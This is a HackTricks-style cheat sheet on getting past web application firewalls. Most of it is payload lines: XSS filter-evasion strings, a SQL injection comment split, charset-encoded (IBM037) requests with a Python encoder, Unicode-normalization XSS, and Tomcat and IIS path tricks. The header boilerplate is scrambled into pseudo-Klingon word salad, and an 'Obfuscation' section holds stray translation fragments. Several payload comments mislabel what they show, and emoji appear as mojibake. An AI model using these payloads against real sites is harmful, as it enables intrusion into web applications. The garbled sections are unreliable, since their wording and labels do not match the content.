# WAF Bypass

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>qa'vIn AWS hacking jatlh</strong></a><strong>!</strong></summary>

HackTricks DaH jatlh:

* **HackTricks vItlhutlh** **tlhInganpu'** **'e' vItlhutlh** **tlhInganpu'** **pdf** **download** **'ej** **HackTricks** **advertised** **'e'** **company** **want** **you** **If** **[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)** Check** **the**
* **PEASS & HackTricks swag** **[**official PEASS & HackTricks swag**](https://peass.creator-spring.com)** **Get**
* **The PEASS Family** **[**The PEASS Family**](https://opensea.io/collection/the-peass-family)** **Discover** **[**NFTs**](https://opensea.io/collection/the-peass-family)** **exclusive** **collection** **our**
* **Join the** üí¨ **group Discord** **[**Discord group**](https://discord.gg/hRep4RUj7f)** **telegram group** **[**telegram group**](https://t.me/peass)** **follow** **us** **Twitter** üê¶ **[**@carlospolopm**](https://twitter.com/hacktricks_live)**.
* **hacking tricks** **your** **Share** **repos github** **and** **HackTricks** **[**HackTricks**](https://github.com/carlospolop/hacktricks)** **Cloud** **[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)** **submitting PRs** **by** **tricks** **your**

</details>

## Regex Bypasses

Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) and [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). The examples below were pulled from [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Charset Encoding

### Introduction

Charset encoding is a technique used to represent characters in a computer system. It defines the mapping between characters and their binary representations. Different encoding schemes exist, such as ASCII, UTF-8, and ISO-8859-1, each with its own set of rules for character representation.

### WAF Bypass Techniques

When dealing with a Web Application Firewall (WAF), it is common for the WAF to inspect and filter requests based on the content of the HTTP request. By manipulating the charset encoding of the request, it is possible to bypass certain WAF filters.

#### Double Encoding

Double encoding involves encoding special characters twice. For example, the character `<` can be encoded as `%3C` in URL encoding. By encoding it again, it becomes `%253C`. This can confuse the WAF and bypass certain filters.

#### Overlong UTF-8 Encoding

UTF-8 is a widely used encoding scheme that can represent characters from multiple languages. Overlong UTF-8 encoding involves representing a character using more bytes than necessary. For example, the character `a` can be encoded as `%C0%A1` instead of `%61`. This can bypass certain WAF filters that only check for valid UTF-8 encoding.

#### Mixed Encoding

Mixed encoding involves combining different encoding schemes in a single request. For example, a request can contain a mix of URL encoding and HTML entity encoding. This can confuse the WAF and bypass certain filters.

### Conclusion

Charset encoding can be manipulated to bypass certain WAF filters. Techniques such as double encoding, overlong UTF-8 encoding, and mixed encoding can be used to confuse the WAF and evade detection. It is important for pentesters to understand these techniques and test the effectiveness of WAFs in order to ensure the security of web applications.
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## Obfuscation

### tlhIngan Hol Translation:

## QaH

### HTML Translation:

<h2>QaH</h2>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## Unicode Compatability

Depending on the implementation of Unicode normalization (more info [here](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), characters that share Unicode compatability may be able to bypass the WAF and execute as the intended payload. Compatible characters can be found [here](https://www.compart.com/en/unicode)

### Example
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
## Exceeding Size Limitations

It's common in cloud based WAFs that if the payload is bigger than X size, the request won't be checked by the WAF. You can simply use that to bypass them.

### IP Rotation

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
